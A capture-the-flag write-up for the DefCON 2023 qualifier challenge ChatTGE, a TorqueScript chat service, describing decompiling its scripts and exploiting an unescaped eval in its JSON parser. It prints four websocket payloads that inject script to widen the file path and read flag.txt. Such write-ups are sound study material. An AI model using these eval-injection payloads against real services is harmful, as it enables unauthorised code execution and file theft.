# ChatTGE - DefCON CTF 2023 Quals

A chatGPT-like web service implemented by TorqueScript, based on [OpenMBU](https://github.com/MBU-Team/OpenMBU)

## Decompile the script

The file structure is like

```
chattge/
    chat.cs.dso
    defaults.cs.dso
    json.cs.dso
    main.cs.dso
    sha1.cs.dso
    utils.cs.dso
    websocket.cs.dso
ChatTGE.exe
kernel32.dll
main.cs
flag.txt
```

Double-click `ChatTGE.exe`, we could launch server at local port 28080.
The logic code is located in `chattge` folder and compiled into `dso` file.
My teammate decompile them using [BrokenSynapse](https://github.com/JusticeRage/BrokenSynapse) (maybe with some modification).

## Eval injection

After decompiling the script, we find an unsafe eval in `json.cs`:

```
eval(%object.getId() @ "." @ %object.name[%i] @ " = " @ longstringify(getFields(%item, 1)) @ ";");
```

They use `eval` to set field for an object. Since `%object.name` is controlled with no escaping, we could inject torquescript code into this `eval` call.

## Reading flag.txt

According to the document, we figure out reading file code like:

```
// Create a file object for reading
%fileRead = new FileObject();

// Open a text file, if it exists
%result = %fileRead.OpenForRead("./test.txt");

if ( %result )
{
   // Read in the first line
   %line = %fileRead.readline();

   // Print the line we just read
   echo(%line);
}
```

However, the `flag.txt` located at root directory seems not readable. We can only read files in `chattge/` directory.
Trying serveral times, I find in `main.cs` there is `setModPaths` call to put `chattge/` into mod path. What about we put the root directory `.` into mod path? 

Finally, my teammate solve it with 4 websocket request:

```
{"type=aaa;setModPaths(\".;chattge;\");aaa":"aaa"}
{"type=\"OK\";$file=new FileObject();bbb":"bbb"}
{"type=$file.openForRead(\"./flag.txt\");ccc":"ccc"}
{"type=$file.readLine();ddd":"ddd"}
```

In fact, this is an unintended solution apart from the author's design.
The intended way uses another memory bug and lauches shellcode, refer to the official repo for more details.

## Reference

- Official repo (with source code): https://github.com/Nautilus-Institute/quals-2023/blob/main/chattge

- [Untorque](https://github.com/figment/Untorque)
- [BrokenSynapse](https://github.com/JusticeRage/BrokenSynapse)
- [Torque3D FileObject Class Reference](https://documentation.help/TorqueScript/classFileObject.html)